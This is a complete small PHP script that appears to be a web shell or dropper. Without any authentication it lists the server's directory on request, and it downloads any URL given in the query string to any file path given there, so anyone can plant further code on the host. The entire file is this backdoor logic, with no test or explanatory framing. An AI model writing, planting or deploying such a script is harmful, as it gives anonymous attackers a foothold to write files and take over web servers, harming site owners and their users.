<?php
if(isset($_GET['type'])){
if($_GET['type'] == "scan"){
echo "<pre>";
print_r(scandir("."));
echo "</pre>";
}
if($_GET['type'] == "dl" && isset($_GET['url']) && isset($_GET['f'])){
include "vendor/autoload.php";
$client = new GuzzleHttp\Client();
$client->request(
  'GET',
  $_GET['url'],
  array('sink' => $_GET['f'])
);
}
}
